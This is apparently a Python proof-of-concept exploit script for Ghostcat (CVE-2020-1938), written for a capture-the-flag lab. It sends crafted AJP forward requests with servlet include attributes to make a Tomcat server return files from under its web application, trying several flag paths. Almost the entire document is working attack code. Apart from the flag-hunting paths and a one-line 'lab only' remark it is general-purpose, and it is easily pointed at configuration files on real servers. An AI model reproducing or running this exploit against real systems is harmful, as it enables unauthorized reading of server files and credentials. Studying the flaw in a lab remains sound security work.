#!/usr/bin/env python3
"""
exploit.py
PoC AJP client that attempts to exploit Ghostcat (CVE-2020-1938) by using AJP
forward request with include attributes to read files under the webapp.
Use ONLY in your lab environment (this repo).
Usage:
  python3 exploit.py [host] [port]
"""
import sys
import socket
import struct

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8009
TIMEOUT = 5.0

# Candidate paths to try (common places for CTF flag)
CANDIDATES = [
    "/WEB-INF/flag.txt",
    "/flag.txt",
    "/WEB-INF/classes/flag.txt",
    "/WEB-INF/uploads/flag.txt"
]

def ajp_string(s):
    if s is None:
        return struct.pack(">h", -1)
    b = s.encode("utf-8")
    return struct.pack(">H", len(b)) + b + b"\x00"

def build_forward_request(target_path, host="localhost", port=80):
    body = bytearray()
    body.append(0x02)  # Forward request
    body.append(0x02)  # Method: GET (0x02)
    body += ajp_string("HTTP/1.1")           # protocol

    # request_uri should be "/" â€” the include attributes carry the target file path
    body += ajp_string("/")                  # request_uri

    body += ajp_string("127.0.0.1")          # remote_addr
    body += ajp_string("127.0.0.1")          # remote_host
    body += ajp_string(host)                 # server_name
    body += struct.pack(">H", port)          # server_port
    body.append(0x00)                        # is_ssl = false

    # add some common headers (Host, User-Agent, Accept)
    headers = [
        ("Host", f"{host}:{port}"),
        ("User-Agent", "Mozilla/5.0"),
        ("Accept", "*/*"),
    ]
    body += struct.pack(">H", len(headers))
    for name, value in headers:
        body += ajp_string(name)
        body += ajp_string(value)

    # Attributes: set include-related attributes to try to force the container to include the file
    # add context_path (empty for ROOT), servlet_path, path_info and request_uri
    attrs = [
        ("javax.servlet.include.context_path", ""),
        ("javax.servlet.include.request_uri", target_path),
        ("javax.servlet.include.servlet_path", target_path),
        ("javax.servlet.include.path_info", ""),
    ]
    for name, val in attrs:
        body.append(0x0A)
        body += ajp_string(name)
        body += ajp_string(val)

    # terminator for attributes
    body.append(0xFF)

    # prepend AJP header (0x1234 + length)
    pkt = struct.pack(">H", 0x1234) + struct.pack(">H", len(body)) + bytes(body)
    return pkt

def recv_all(sock):
    data = b""
    try:
        while True:
            part = sock.recv(4096)
            if not part:
                break
            data += part
            if b"FLAG{" in data or len(data) > 20000:
                break
    except socket.timeout:
        pass
    return data

def try_path(path):
    print(f"[*] trying path: {path}")
    pkt = build_forward_request(path, host="localhost", port=8080)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(TIMEOUT)
    try:
        s.connect((HOST, PORT))
        s.sendall(pkt)
        resp = recv_all(s)
        if not resp:
            print("[-] no response (or timed out)")
            return None

        # try to find start of HTML/body to improve signal-to-noise
        markers = [b'FLAG{', b'<!doctype', b'<html', b'<HTML', b'<title', b'\r\n\r\n']
        pos = -1
        for m in markers:
            idx = resp.find(m)
            if idx != -1:
                pos = idx
                break
        body = resp[pos:] if pos != -1 else resp

        try:
            text = body.decode("utf-8", errors="replace")
        except:
            text = str(body)

        if "FLAG{" in text:
            start = text.find("FLAG{")
            end = text.find("}", start)
            if end != -1:
                flag = text[start:end+1]
                print("[+] FLAG found:", flag)
            else:
                print("[+] Potential flag content found:")
                print(text)
            return text

        if len(text) > 0:
            print("[*] response snippet:")
            print(text[:200])
        return text
    except Exception as e:
        print("[-] error:", e)
        return None
    finally:
        s.close()

def main():
    print(f"Target AJP: {HOST}:{PORT}")
    for p in CANDIDATES:
        out = try_path(p)
        if out and "FLAG{" in out:
            print("[*] success, stop")
            return
    print("[-] done, flag not found in candidates. Inspect raw response / try other paths.")

if __name__ == "__main__":
    main()
